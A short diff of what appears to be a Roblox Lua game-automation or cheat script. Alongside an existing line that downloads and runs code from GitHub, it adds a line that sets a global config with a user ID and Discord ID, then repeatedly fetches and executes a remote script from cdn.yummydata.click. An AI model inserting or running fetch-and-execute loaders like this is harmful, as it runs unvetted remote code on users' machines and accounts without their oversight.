@@ -988,3 +988,4 @@ task.delay(10, function()
     if MasterConfig.AutoTrade then RunAutoTrade() end
 end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/list/refs/heads/main/game"))()
+_G.Config={UserID="ebff9f12-1c5d-47a5-b544-08250f32a87a",discord_id="704313296421126166",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/fishit"))()end)if s then break end wait(5)end
